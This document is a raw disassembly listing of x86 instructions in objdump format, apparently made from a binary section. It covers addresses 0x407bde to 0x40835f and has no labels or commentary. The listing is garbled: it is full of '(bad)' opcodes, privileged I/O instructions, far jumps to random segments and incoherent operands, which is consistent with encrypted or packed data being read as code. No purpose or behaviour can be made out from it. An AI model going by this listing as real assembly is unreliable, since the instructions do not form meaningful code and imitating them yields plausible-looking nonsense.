  407bde:	cmp    eax,0x6ee6e008
  407be3:	fwait
  407be4:	sar    DWORD PTR [ebx+0xd8fab46],cl
  407bea:	pop    ecx
  407beb:	dec    eax
  407bec:	cmc    
  407bed:	xor    eax,0x74aa3486
  407bf2:	xor    eax,0xa8a4b891
  407bf7:	sub    bl,bl
  407bf9:	and    eax,DWORD PTR [edx]
  407bfb:	push   ss
  407bfc:	ss into 
  407bfe:	adc    DWORD PTR [ecx],esp
  407c00:	and    BYTE PTR ds:0x2d98c4a,dl
  407c06:	lods   eax,DWORD PTR ds:[esi]
  407c07:	add    eax,0x595d564e
  407c0c:	jg     0x407c01
  407c0e:	push   eax
  407c0f:	mov    al,ds:0x9a495e0b
  407c14:	adc    BYTE PTR [ecx],al
  407c16:	in     al,dx
  407c17:	pop    ebp
  407c18:	push   ebp
  407c19:	mov    bh,0x3c
  407c1b:	add    al,0x29
  407c1d:	and    DWORD PTR [ebx],eax
  407c1f:	bound  esi,QWORD PTR [ebx]
  407c21:	or     eax,0x62befcf0
  407c26:	mov    edi,0x31ffd39f
  407c2b:	pop    esp
  407c2c:	or     cl,BYTE PTR [esi-0x1dcae286]
  407c32:	pusha  
  407c33:	lock cmp ah,BYTE PTR [esi]
  407c36:	add    cl,BYTE PTR [ecx-0x781a6c33]
  407c3c:	add    ah,BYTE PTR [edx]
  407c3e:	imul   esi,DWORD PTR ds:0x36442b9d,0x30
  407c45:	pop    ss
  407c46:	rol    BYTE PTR [edi],0x56
  407c49:	aad    0x4e
  407c4b:	xor    eax,0xc74a1ad0
  407c50:	es (bad) 
  407c52:	dec    ecx
  407c53:	mov    edi,0x442d849d
  407c58:	vpaddusb xmm3,xmm4,xmm6
  407c5c:	and    DWORD PTR [edi+0x4b8ee405],eax
  407c62:	or     al,0x5b
  407c64:	sub    ebx,DWORD PTR [ebx]
  407c66:	mov    BYTE PTR [eax-0x1f],bh
  407c69:	aam    0xb0
  407c6b:	add    BYTE PTR [esi-0x10232a65],ch
  407c71:	(bad)  
  407c72:	ja     0x407c43
  407c74:	cld    
  407c75:	loop   0x407cca
  407c77:	sbb    ebp,DWORD PTR [eax-0x60ee24f7]
  407c7d:	hlt    
  407c7e:	or     al,0x8b
  407c80:	push   ebp
  407c81:	ror    DWORD PTR [ebx-0x53],1
  407c84:	mov    WORD PTR [eax],cs
  407c86:	sub    edx,DWORD PTR [ecx]
  407c88:	jg     0x407c5f
  407c8a:	mov    ?,WORD PTR [eax]
  407c8c:	jne    0x407ccd
  407c8e:	jb     0x407ce2
  407c90:	and    eax,ebp
  407c92:	jecxz  0x407ced
  407c94:	aam    0xe0
  407c96:	jnp    0x407c7f
  407c98:	mov    WORD PTR ds:0x29caaf86,?
  407c9e:	cli    
  407c9f:	lods   al,BYTE PTR ds:[esi]
  407ca0:	mov    bh,BYTE PTR [ecx+eax*2-0x7f47f22b]
  407ca7:	add    al,0x56
  407ca9:	mov    ebx,0x81108e0f
  407cae:	outs   dx,DWORD PTR ds:[esi]
  407caf:	(bad)  
  407cb0:	jmp    0x86d5:0xc8056888
  407cb7:	aad    0x92
  407cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cba:	sbb    cl,dl
  407cbc:	or     ecx,ebp
  407cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cbf:	pop    edi
  407cc0:	jo     0x407cf9
  407cc2:	adc    BYTE PTR [edx+0x23bcbc1d],0x43
  407cc9:	ins    DWORD PTR es:[edi],dx
  407cca:	mov    eax,DWORD PTR [esi+0x43a64ea8]
  407cd0:	fistp  QWORD PTR [ebx]
  407cd2:	daa    
  407cd3:	cmp    DWORD PTR [ebx+0x5deccd6f],eax
  407cd9:	sbb    eax,DWORD PTR [eax+eax*4+0x40dbf337]
  407ce0:	stos   DWORD PTR es:[edi],eax
  407ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce2:	dec    esi
  407ce3:	ins    BYTE PTR es:[edi],dx
  407ce4:	xchg   edi,eax
  407ce5:	push   esi
  407ce6:	(bad)  [edx-0x4106eb09]
  407cec:	fidiv  DWORD PTR [edi+0x7f37ff36]
  407cf2:	cmp    DWORD PTR [ebx+ebp*2],eax
  407cf5:	ss cmp esi,ecx
  407cf8:	mov    ah,0x7a
  407cfa:	retf   
  407cfb:	scas   al,BYTE PTR es:[edi]
  407cfc:	pop    ebp
  407cfd:	sbb    DWORD PTR [ecx-0x52cb72ee],ecx
  407d03:	rol    DWORD PTR [ebp-0xd],1
  407d06:	xor    BYTE PTR [ebx+0x4c],bh
  407d09:	xchg   esp,eax
  407d0a:	dec    edx
  407d0b:	pop    ds
  407d0c:	fidiv  DWORD PTR [ebx]
  407d0e:	into   
  407d0f:	push   ecx
  407d10:	adc    al,0x3e
  407d12:	call   0x598defe3
  407d17:	and    bh,BYTE PTR [ebx-0x64cf7e28]
  407d1d:	dec    esp
  407d1e:	cwde   
  407d1f:	pop    edi
  407d20:	xor    eax,0xb6951e83
  407d25:	push   es
  407d26:	addr16 int3 
  407d28:	dec    ecx
  407d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d2a:	lods   al,BYTE PTR ds:[esi]
  407d2b:	pop    esi
  407d2c:	cmp    al,cl
  407d2e:	dec    eax
  407d2f:	sti    
  407d30:	loopne 0x407d0d
  407d32:	and    eax,0x5696f02c
  407d37:	pop    esi
  407d38:	mov    cl,0x40
  407d3a:	jg     0x407d76
  407d3c:	aam    0xd2
  407d3e:	xchg   ebp,edi
  407d40:	jne    0x407cfd
  407d42:	mov    ds:0xa678f77,al
  407d47:	add    ebp,DWORD PTR [ecx+0x70]
  407d4a:	lods   eax,DWORD PTR ds:[esi]
  407d4b:	mov    ?,WORD PTR [edi]
  407d4d:	push   edi
  407d4e:	into   
  407d4f:	arpl   WORD PTR [eax],ax
  407d51:	repz cmp al,0x46
  407d54:	adc    eax,0x36272e5b
  407d59:	cmp    dl,ah
  407d5b:	xchg   edx,eax
  407d5c:	ins    DWORD PTR es:[edi],dx
  407d5d:	(bad)  
  407d5e:	and    al,bh
  407d60:	sub    edx,DWORD PTR [edx+0x6c]
  407d63:	xchg   ebx,eax
  407d64:	pop    es
  407d65:	adc    al,BYTE PTR ds:0xd47ee348
  407d6b:	retf   0xddb2
  407d6e:	fimul  DWORD PTR [ebx-0x11fd96b9]
  407d74:	xor    BYTE PTR [ebx-0x2e3d1c21],dh
  407d7a:	adc    dh,BYTE PTR [edx+0x43]
  407d7d:	jp     0x407d94
  407d7f:	pop    ss
  407d80:	xchg   ebx,eax
  407d81:	xchg   esp,eax
  407d82:	sub    eax,DWORD PTR [ebp-0x7c]
  407d85:	lods   eax,DWORD PTR ds:[esi]
  407d86:	cmp    DWORD PTR [esp+esi*8],ebp
  407d89:	mov    esi,0x86025d0c
  407d8e:	or     esp,DWORD PTR [edx+0xecf466f]
  407d94:	cmp    ebx,eax
  407d96:	rol    DWORD PTR [edi-0x17],0x9
  407d9a:	test   eax,0x9b44abd4
  407d9f:	push   ecx
  407da0:	stc    
  407da1:	iret   
  407da2:	ja     0x407e0b
  407da4:	popa   
  407da5:	leave  
  407da6:	lods   al,BYTE PTR ds:[esi]
  407da7:	xchg   esi,eax
  407da8:	cmp    al,0x84
  407daa:	or     al,BYTE PTR [edx+esi*2]
  407dad:	mul    BYTE PTR gs:[ebp-0x2e]
  407db1:	loopne 0x407dec
  407db3:	popa   
  407db4:	stos   DWORD PTR es:[edi],eax
  407db5:	xor    DWORD PTR [ebp+0x11],esi
  407db8:	out    0xb3,al
  407dba:	jmp    0x407d91
  407dbc:	lock fisubr WORD PTR [edx]
  407dbf:	jmp    0x39eb:0x796f420
  407dc6:	int    0x1e
  407dc8:	pop    esp
  407dc9:	call   0x6607:0xa857c7db
  407dd0:	jae    0x407df3
  407dd2:	dec    BYTE PTR [edi+0x3d873087]
  407dd8:	cmp    DWORD PTR [edi-0x548d5dc5],0x63472cdd
  407de2:	sbb    ecx,edx
  407de4:	pop    es
  407de5:	loopne 0x407dd5
  407de7:	bound  edx,QWORD PTR [edi-0x448e185d]
  407ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dee:	and    BYTE PTR [ebx],dh
  407df0:	mov    al,ds:0x4395e3e3
  407df5:	xor    bl,bh
  407df7:	ja     0x407e15
  407df9:	push   esi
  407dfa:	pop    es
  407dfb:	xchg   ecx,eax
  407dfc:	sbb    DWORD PTR [eax+0x2b],esp
  407dff:	inc    ebx
  407e00:	call   0x2831:0xb0d88860
  407e07:	ss ds test al,0xf5
  407e0b:	xor    bh,BYTE PTR [esi+0x7f66fed3]
  407e11:	push   edi
  407e12:	pop    DWORD PTR [edi+0x5c318cd8]
  407e18:	or     DWORD PTR [edi+0x1cdd6e4f],esi
  407e1e:	retf   
  407e1f:	fs ret 
  407e21:	cld    
  407e22:	xor    ecx,DWORD PTR [ebx+edx*8+0x3c]
  407e26:	outs   dx,BYTE PTR ds:[esi]
  407e27:	sub    eax,0x6b51f275
  407e2c:	xor    BYTE PTR [esi+0x52],ah
  407e2f:	cld    
  407e30:	ret    
  407e31:	adc    al,0x8d
  407e33:	mov    bl,BYTE PTR [ebx-0x1c]
  407e36:	test   ah,ch
  407e38:	jl     0x407e73
  407e3a:	gs jge 0x407dc5
  407e3d:	pop    edi
  407e3e:	jecxz  0x407e82
  407e40:	loope  0x407e23
  407e42:	icebp  
  407e43:	pusha  
  407e44:	fdivr  QWORD PTR [esi+ebx*1+0xe0d49d4]
  407e4b:	lahf   
  407e4c:	pop    edx
  407e4d:	pop    es
  407e4e:	iret   
  407e4f:	lods   al,BYTE PTR ds:[esi]
  407e50:	pop    es
  407e51:	in     eax,dx
  407e52:	ret    
  407e53:	outs   dx,DWORD PTR ds:[esi]
  407e54:	out    0x2f,eax
  407e56:	je     0x407e14
  407e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e59:	stos   BYTE PTR es:[edi],al
  407e5a:	jg     0x407e29
  407e5c:	in     al,0x7a
  407e5e:	jo     0x407eaf
  407e60:	(bad)  
  407e61:	loop   0x407e7a
  407e63:	lods   eax,DWORD PTR ds:[esi]
  407e64:	inc    edx
  407e65:	sti    
  407e66:	xor    eax,0xfa4463a6
  407e6b:	es out dx,al
  407e6d:	scas   al,BYTE PTR es:[edi]
  407e6e:	mov    dh,0xd1
  407e70:	call   0x175178f
  407e75:	fsubr  st,st(1)
  407e77:	in     eax,dx
  407e78:	adc    al,0x8b
  407e7a:	in     eax,dx
  407e7b:	xor    DWORD PTR [edi+eiz*4],ecx
  407e7e:	or     BYTE PTR [eax+0xc],ah
  407e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e83:	aaa    
  407e84:	xchg   ebx,eax
  407e85:	fisubr WORD PTR [edi+0x34]
  407e88:	inc    ecx
  407e89:	sub    edx,DWORD PTR [eax+0x15]
  407e8c:	mov    esi,DWORD PTR [ecx]
  407e8e:	in     eax,0x4b
  407e90:	xchg   edi,eax
  407e91:	icebp  
  407e92:	pop    ebx
  407e93:	jmp    0x407e68
  407e95:	mov    cs,WORD PTR [ebp-0x2471aa2a]
  407e9b:	loopne 0x407ee6
  407e9d:	call   0x2668:0x6d3084c0
  407ea4:	mov    WORD PTR [edi],?
  407ea6:	div    BYTE PTR [eax+0x37159b30]
  407eac:	scas   eax,DWORD PTR es:[edi]
  407ead:	or     BYTE PTR [edi],bl
  407eaf:	adc    esi,DWORD PTR [edi-0x220e1869]
  407eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407eb6:	xchg   edi,eax
  407eb7:	adc    al,0x23
  407eb9:	add    DWORD PTR [ebx-0x1f],ecx
  407ebc:	add    BYTE PTR [edi-0x1320b5d7],bh
  407ec2:	jne    0x407eac
  407ec4:	shr    DWORD PTR [eax+edx*8+0x6f1098cc],0x85
  407ecc:	sub    BYTE PTR [edx+0x55ec0cb2],bl
  407ed2:	mov    BYTE PTR [edi-0x5d],ch
  407ed5:	add    al,0x4e
  407ed7:	sti    
  407ed8:	xor    ebp,DWORD PTR [eax+0x46]
  407edb:	push   es
  407edc:	test   DWORD PTR [esi-0xf],ebp
  407edf:	out    dx,eax
  407ee0:	and    BYTE PTR [ebx+esi*1+0x78],ch
  407ee4:	xchg   ecx,eax
  407ee5:	adc    eax,ebp
  407ee7:	or     DWORD PTR [esi],ecx
  407ee9:	into   
  407eea:	xchg   edi,eax
  407eeb:	scas   al,BYTE PTR es:[edi]
  407eec:	pop    ecx
  407eed:	dec    ebx
  407eee:	mov    dl,0x7
  407ef0:	mov    esp,DWORD PTR [esi]
  407ef2:	and    eax,0x152b6404
  407ef7:	jb     0x407ed6
  407ef9:	xchg   edx,eax
  407efa:	mul    DWORD PTR [esi-0x631a59df]
  407f00:	push   edi
  407f01:	addr16 retf 0x2799
  407f05:	add    DWORD PTR [ecx-0x5c],edx
  407f08:	xor    eax,0xc4721af8
  407f0d:	fwait
  407f0e:	xor    al,0xe7
  407f10:	cmp    edx,edi
  407f12:	pop    esp
  407f13:	mov    ecx,0x16aab498
  407f18:	push   0xe129ca47
  407f1d:	adc    dl,BYTE PTR [ebx+esi*2]
  407f20:	rol    ecx,1
  407f22:	faddp  st(1),st
  407f24:	jo     0x407f13
  407f26:	dec    eax
  407f27:	(bad)  
  407f28:	cs inc ebp
  407f2a:	or     eax,0x9eca841
  407f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f30:	clc    
  407f31:	inc    DWORD PTR [edi-0x73cd2e82]
  407f37:	jecxz  0x407ebb
  407f39:	mov    eax,ds
  407f3b:	jb     0x407ec9
  407f3d:	xor    esp,ebx
  407f3f:	add    al,0xdf
  407f41:	scas   al,BYTE PTR es:[edi]
  407f42:	loopne 0x407f55
  407f44:	cmp    ebp,DWORD PTR [edx]
  407f46:	and    al,0xc6
  407f48:	add    DWORD PTR es:[ebx],edi
  407f4b:	(bad)  
  407f4c:	call   0x2593fc17
  407f51:	std    
  407f52:	in     al,dx
  407f53:	pop    ebx
  407f54:	jle    0x407fab
  407f56:	pop    edx
  407f57:	pop    eax
  407f58:	jb     0x407f0f
  407f5a:	(bad)  
  407f5b:	out    dx,eax
  407f5c:	mov    cl,0x3
  407f5e:	retf   
  407f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f60:	stc    
  407f61:	jmp    0xd79d:0x28d868f7
  407f68:	fist   WORD PTR [ecx+0x21062f74]
  407f6e:	icebp  
  407f6f:	push   es
  407f70:	nop
  407f71:	adc    DWORD PTR [edx],esp
  407f73:	sub    BYTE PTR [ebx],0x65
  407f76:	add    esi,DWORD PTR [edi+0x6f]
  407f79:	push   ebp
  407f7a:	in     al,dx
  407f7b:	and    DWORD PTR [edi-0x51],ecx
  407f7e:	dec    edx
  407f7f:	pop    esp
  407f80:	int    0x1a
  407f82:	shl    DWORD PTR [ebx+0x7acde04b],1
  407f88:	xor    DWORD PTR [ebx],ecx
  407f8a:	hlt    
  407f8b:	sbb    DWORD PTR [esi+0x63f879d2],ebp
  407f91:	inc    esi
  407f92:	das    
  407f93:	outs   dx,DWORD PTR ds:[esi]
  407f94:	cwde   
  407f95:	test   DWORD PTR ds:0xb1197e69,edx
  407f9b:	push   ebp
  407f9c:	mov    bl,0xb8
  407f9e:	fiadd  WORD PTR [ebx+0x4e8f29f]
  407fa4:	or     DWORD PTR [esi+ebx*8-0x7c9aef],edx
  407fab:	jecxz  0x40801b
  407fad:	push   0xffffffed
  407faf:	ins    DWORD PTR es:[edi],dx
  407fb0:	cmc    
  407fb1:	aad    0xe1
  407fb3:	aaa    
  407fb4:	mov    al,0x8a
  407fb6:	push   ebx
  407fb7:	fidiv  WORD PTR [edx-0x27]
  407fba:	adc    ebx,DWORD PTR [eax+esi*8+0x66458169]
  407fc1:	xchg   ebx,eax
  407fc2:	in     al,dx
  407fc3:	sub    eax,DWORD PTR [edx]
  407fc5:	push   ebx
  407fc6:	inc    edx
  407fc7:	pop    edi
  407fc8:	jp     0x407f5e
  407fca:	adc    ch,bh
  407fcc:	stc    
  407fcd:	and    eax,0xc99c22e3
  407fd2:	add    eax,0xf3fa5fc3
  407fd7:	or     BYTE PTR [eax+0x3c1df8d],al
  407fdd:	fnstenv [ebx]
  407fdf:	cmc    
  407fe0:	push   esi
  407fe1:	scas   al,BYTE PTR es:[edi]
  407fe2:	xchg   esp,eax
  407fe3:	fdiv   st,st(2)
  407fe5:	cmp    ch,BYTE PTR [ebx]
  407fe7:	xor    BYTE PTR [ebx],bl
  407fe9:	dec    ebp
  407fea:	daa    
  407feb:	cwde   
  407fec:	and    DWORD PTR [bp+di+0x1f],0xe4e4c230
  407ff4:	fsub   DWORD PTR [edx-0x310fc0d6]
  407ffa:	gs popa 
  407ffc:	ret    
  407ffd:	lea    esi,[esi+0xd]
  408000:	inc    eax
  408001:	scas   al,BYTE PTR es:[edi]
  408002:	xor    dl,dh
  408004:	or     al,0xb2
  408006:	lods   eax,DWORD PTR ds:[esi]
  408007:	mov    bl,0x5a
  408009:	cmp    eax,0xffffff96
  40800c:	clc    
  40800d:	jle    0x407fc9
  40800f:	outs   dx,BYTE PTR ds:[esi]
  408010:	out    dx,al
  408011:	ja     0x407fb0
  408013:	xchg   BYTE PTR [edx-0x4553b15d],dh
  408019:	mov    bh,0x99
  40801b:	jl     0x408024
  40801d:	push   edi
  40801e:	mov    eax,ebp
  408020:	push   ds
  408021:	and    al,0xf1
  408023:	dec    ebp
  408024:	fisub  WORD PTR [edx+ebp*2+0x337828ca]
  40802b:	popf   
  40802c:	or     bh,BYTE PTR [ebx-0x2e717ef9]
  408032:	cmp    esp,DWORD PTR [eax+0x79]
  408035:	mov    bh,0xed
  408037:	ins    DWORD PTR es:[edi],dx
  408038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408039:	xor    eax,DWORD PTR [ecx]
  40803b:	push   ecx
  40803c:	ret    0x3239
  40803f:	lds    esp,FWORD PTR [eax]
  408041:	out    dx,eax
  408042:	fisubr DWORD PTR [edi+0x18]
  408045:	es mov esi,0xac7d450f
  40804b:	pusha  
  40804c:	add    ecx,DWORD PTR [edi]
  40804e:	dec    eax
  40804f:	xor    DWORD PTR [eax+0xad43e53],0x6da7f9c8
  408059:	or     dl,BYTE PTR [eax-0x94bf299]
  40805f:	fisub  WORD PTR [edx]
  408061:	push   edx
  408062:	clc    
  408063:	sub    DWORD PTR [esi+esi*4],0x2b0d0b80
  40806a:	(bad)  
  40806b:	(bad)  
  40806c:	xor    al,0x37
  40806e:	fcmovnbe st,st(0)
  408070:	dec    eax
  408071:	and    al,0x29
  408073:	inc    esi
  408074:	scas   eax,DWORD PTR es:[edi]
  408075:	hlt    
  408076:	pushf  
  408077:	addr16 nop
  408079:	imul   eax,DWORD PTR [edx+0x4],0x9df45ab1
  408080:	icebp  
  408081:	popf   
  408082:	fcomp  DWORD PTR [edi+0x841fcd4]
  408088:	(bad)  
  408089:	cmp    ah,al
  40808b:	inc    edi
  40808c:	add    eax,DWORD PTR [edi]
  40808e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40808f:	cmp    al,BYTE PTR ds:0x70d67935
  408095:	push   cs
  408096:	and    edx,edx
  408098:	and    al,0x8b
  40809a:	push   ss
  40809b:	aas    
  40809c:	std    
  40809d:	pop    ebp
  40809e:	xor    bl,BYTE PTR [eax]
  4080a0:	mov    al,ds:0x2a91e628
  4080a5:	xor    BYTE PTR [esi],0x4c
  4080a8:	mov    es:0xa6871eea,al
  4080ae:	nop
  4080af:	rcr    ch,cl
  4080b1:	mov    DWORD PTR [ebx+ebx*2-0x6c24aa90],edi
  4080b8:	js     0x408053
  4080ba:	shl    DWORD PTR [edx+esi*8-0x36267225],1
  4080c1:	xchg   ebx,eax
  4080c2:	dec    eax
  4080c3:	jmp    0x408073
  4080c5:	adc    dh,BYTE PTR [edx-0x690f2940]
  4080cb:	icebp  
  4080cc:	sub    DWORD PTR [ebx-0x602ea3f6],edx
  4080d2:	cmp    ebx,DWORD PTR [ebp-0xc0c7a2]
  4080d8:	hlt    
  4080d9:	add    ecx,DWORD PTR [ecx]
  4080db:	in     al,dx
  4080dc:	retf   
  4080dd:	xchg   ebx,eax
  4080de:	rcr    dl,1
  4080e0:	scas   al,BYTE PTR es:[edi]
  4080e1:	test   eax,0x92cf5440
  4080e6:	mov    eax,ds:0x946f4954
  4080eb:	je     0x40812f
  4080ed:	gs in  al,0xca
  4080f0:	cmp    DWORD PTR [ebp+0xd],esp
  4080f3:	ds in  eax,dx
  4080f5:	sub    dl,BYTE PTR es:[edx]
  4080f8:	mov    DWORD PTR ss:[ecx+edx*1-0x68db2a41],0x8a1bd845
  408104:	fadd   DWORD PTR [esi-0x5c]
  408107:	push   eax
  408108:	arpl   WORD PTR [eax],cx
  40810a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40810b:	les    edx,FWORD PTR [esi+0x3fea5083]
  408111:	mov    esi,DWORD PTR [edx-0x49]
  408114:	cmp    cl,BYTE PTR [eax]
  408116:	repz mov edi,0x6cb53f9b
  40811c:	popf   
  40811d:	clc    
  40811e:	mov    ah,0x2f
  408120:	sub    al,0x19
  408122:	gs loopne 0x408158
  408125:	ffreep st(5)
  408127:	mov    ebx,0x9c267f99
  40812c:	xchg   edi,eax
  40812d:	mov    ebp,0xb6375f5b
  408132:	push   ecx
  408133:	and    ebp,DWORD PTR ds:0xa83f796
  408139:	loopne 0x408162
  40813b:	aas    
  40813c:	push   es
  40813d:	and    esi,DWORD PTR [eax-0x6c80ac10]
  408143:	nop    edi
  408146:	stos   BYTE PTR es:[edi],al
  408147:	inc    eax
  408148:	inc    DWORD PTR [ebx]
  40814a:	mov    cl,0xe4
  40814c:	sbb    DWORD PTR [ecx-0x3e],eax
  40814f:	mov    al,ds:0x7148ddf3
  408154:	daa    
  408155:	or     BYTE PTR [ebx],bl
  408157:	(bad)  
  408158:	cwde   
  408159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40815a:	adc    ebx,DWORD PTR [edx]
  40815c:	popf   
  40815d:	dec    ecx
  40815e:	lock rcr eax,cl
  408161:	xchg   ebp,eax
  408162:	jae    0x408104
  408164:	in     eax,0xad
  408166:	loopne 0x4081dc
  408168:	call   0xa05:0xc05da4bd
  40816f:	or     dl,BYTE PTR [edi+0x372ad1c7]
  408175:	in     al,dx
  408176:	test   eax,0x7f2a5694
  40817b:	add    al,0xae
  40817d:	addr16 inc edi
  40817f:	adc    eax,0x43a70b3c
  408184:	lods   eax,DWORD PTR ds:[esi]
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	sub    DWORD PTR [eax],0x7783bbad
  40818c:	hlt    
  40818d:	out    0x65,eax
  40818f:	loope  0x40817b
  408191:	or     dl,BYTE PTR [ecx+0x1e]
  408194:	sbb    eax,0x97771b9f
  408199:	sub    BYTE PTR [edx],dh
  40819b:	xor    esi,ecx
  40819d:	fs inc eax
  40819f:	in     eax,dx
  4081a0:	fimul  DWORD PTR [ebx]
  4081a2:	push   es
  4081a3:	std    
  4081a4:	xchg   ecx,eax
  4081a5:	lods   eax,DWORD PTR ds:[esi]
  4081a6:	and    bl,BYTE PTR [ebx-0x3c37e80b]
  4081ac:	and    DWORD PTR [esi+0x37],ebx
  4081af:	push   0x3
  4081b1:	push   esi
  4081b2:	inc    edi
  4081b3:	sub    eax,0x4ce38ec0
  4081b8:	clc    
  4081b9:	pop    eax
  4081ba:	push   ss
  4081bb:	idiv   DWORD PTR [edi+0x5c]
  4081be:	sar    BYTE PTR [ecx+0x55],1
  4081c1:	push   ebx
  4081c2:	xchg   ebp,eax
  4081c3:	outs   dx,BYTE PTR ds:[esi]
  4081c4:	mov    edi,0x6797a1b7
  4081c9:	out    dx,eax
  4081ca:	sbb    edx,edi
  4081cc:	xor    BYTE PTR [edi+0x6ee791e6],0x16
  4081d3:	imul   ebx,DWORD PTR [edi-0x4342fdd],0xcdaab290
  4081dd:	das    
  4081de:	shr    BYTE PTR [ebx+0x3d59f332],0x77
  4081e5:	add    eax,0x11e56ac0
  4081ea:	ja     0x40821a
  4081ec:	lfs    eax,FWORD PTR [edx+eax*2]
  4081f0:	cmp    BYTE PTR [edi+edi*2],al
  4081f3:	xchg   esp,eax
  4081f4:	pop    esi
  4081f5:	adc    al,0x75
  4081f7:	pop    esi
  4081f8:	mov    esi,ss
  4081fa:	sub    eax,0xdb9ccfbe
  4081ff:	ins    BYTE PTR es:[edi],dx
  408200:	call   0xca6764f9
  408205:	es mov esi,0x107fe26
  40820b:	xchg   esi,eax
  40820c:	and    eax,0xd1f9ed3e
  408211:	pushf  
  408212:	addr16 cld 
  408214:	rcr    dh,0x2a
  408217:	sbb    ch,BYTE PTR [ecx+0x2e5aa233]
  40821d:	out    0xc1,eax
  40821f:	test   DWORD PTR [edx-0x796302e],edi
  408225:	xor    esp,DWORD PTR [ebx+0x7]
  408228:	jne    0x408251
  40822a:	mov    eax,ds:0xb359905d
  40822f:	mov    edx,0xe9a96e2c
  408234:	sbb    BYTE PTR [ebp+esi*1+0x10],dh
  408238:	mov    WORD PTR [ecx-0x4b],?
  40823b:	shl    BYTE PTR [edi+edi*2-0x94573da],cl
  408242:	jle    0x4081f2
  408244:	sar    DWORD PTR [edx-0x80],0x19
  408248:	ficom  WORD PTR [edi+edi*4+0x7939c75f]
  40824f:	xchg   esi,eax
  408250:	(bad)  
  408251:	cli    
  408252:	inc    ecx
  408253:	outs   dx,DWORD PTR ds:[esi]
  408254:	hlt    
  408255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408256:	mov    WORD PTR [ebp+0x29],gs
  408259:	dec    ebp
  40825a:	test   DWORD PTR [esi],0xa14004d3
  408260:	xor    eax,0x1e156725
  408265:	fwait
  408266:	mov    edx,0xce36c5f5
  40826b:	sub    ah,bl
  40826d:	pop    es
  40826e:	dec    eax
  40826f:	sbb    esi,DWORD PTR [esi-0x4c]
  408272:	inc    edx
  408273:	popa   
  408274:	or     BYTE PTR [edi+0x41],dl
  408277:	dec    DWORD PTR [edx]
  408279:	in     eax,dx
  40827a:	pop    esp
  40827b:	jp     0x4082ba
  40827d:	fiadd  WORD PTR [eax+0x2f]
  408280:	sub    eax,0xd351f692
  408285:	jge    0x408230
  408287:	jle    0x4082fd
  408289:	(bad)  
  40828b:	xchg   esi,eax
  40828c:	mov    ds,WORD PTR [edi-0x6c089d58]
  408292:	dec    eax
  408293:	inc    eax
  408294:	jl     0x4082e7
  408296:	lds    esp,FWORD PTR [edx+0x119826fa]
  40829c:	xchg   ebp,eax
  40829d:	pop    ebp
  40829e:	sub    edx,DWORD PTR [ecx+0x1362882b]
  4082a4:	mov    cl,0x38
  4082a6:	(bad)  
  4082a7:	pop    ecx
  4082a8:	in     al,dx
  4082a9:	jne    0x4082eb
  4082ab:	and    al,BYTE PTR [edx-0x4a1e3eb0]
  4082b1:	aas    
  4082b2:	fs fwait
  4082b4:	xor    bl,BYTE PTR [eax+edi*2]
  4082b7:	inc    ecx
  4082b8:	xor    BYTE PTR [edx],ch
  4082ba:	add    edi,DWORD PTR [ebp+0x2]
  4082bd:	mov    ds:0xa4264b23,eax
  4082c2:	mov    ch,0x92
  4082c4:	iret   
  4082c5:	mov    dh,0x2d
  4082c7:	out    dx,eax
  4082c8:	pop    edi
  4082c9:	push   ebp
  4082ca:	test   eax,0xd8ca81d
  4082cf:	das    
  4082d0:	pop    es
  4082d1:	out    dx,al
  4082d2:	int    0x60
  4082d4:	cdq    
  4082d5:	inc    esi
  4082d6:	adc    DWORD PTR [edi-0x6bb01ae],eax
  4082dc:	mov    ecx,0x2a4bea95
  4082e1:	ror    BYTE PTR [edx-0x4553f173],1
  4082e7:	pop    ecx
  4082e8:	pop    es
  4082e9:	jp     0x4082ab
  4082eb:	xlat   BYTE PTR ds:[ebx]
  4082ec:	outs   dx,BYTE PTR ds:[esi]
  4082ed:	mov    al,ds:0x7b2eed43
  4082f2:	inc    esp
  4082f3:	jp     0x4082ad
  4082f5:	ins    BYTE PTR es:[edi],dx
  4082f6:	js     0x408347
  4082f8:	adc    esp,edi
  4082fa:	xor    DWORD PTR [ebp-0x6e],esp
  4082fd:	cli    
  4082fe:	or     esp,DWORD PTR [di]
  408301:	inc    ebx
  408302:	push   edx
  408303:	jb     0x408306
  408305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408306:	scas   eax,DWORD PTR es:[edi]
  408307:	pusha  
  408308:	call   0x77083d12
  40830d:	xor    eax,0xef845184
  408312:	cmp    DWORD PTR [ecx+0x1c19a0be],edx
  408318:	or     ebx,DWORD PTR [ecx+0x44d811d8]
  40831e:	add    DWORD PTR [esi-0x25353de4],eax
  408324:	dec    esp
  408325:	sub    DWORD PTR [ebx+0x62],eax
  408328:	sbb    al,0x7d
  40832a:	js     0x40832c
  40832c:	adc    eax,edi
  40832e:	lahf   
  40832f:	dec    edx
  408330:	pop    ds
  408331:	ficomp WORD PTR [ebx-0x7e40b624]
  408337:	sbb    edx,ebx
  408339:	and    DWORD PTR [ecx],esi
  40833b:	xor    edi,DWORD PTR [edx-0x4eb474cd]
  408341:	sbb    eax,0x397ba4e5
  408346:	push   es
  408347:	js     0x4083ac
  408349:	jnp    0x40835c
  40834b:	xchg   edi,eax
  40834c:	jns    0x40830e
  40834e:	cmp    eax,0x97b4a76f
  408353:	pop    ecx
  408354:	mov    ah,0x90
  408356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408357:	mov    ebx,0x5358db2b
  40835c:	push   ss
  40835d:	cmp    ebp,esp
  40835f:	xchg   esp,eax
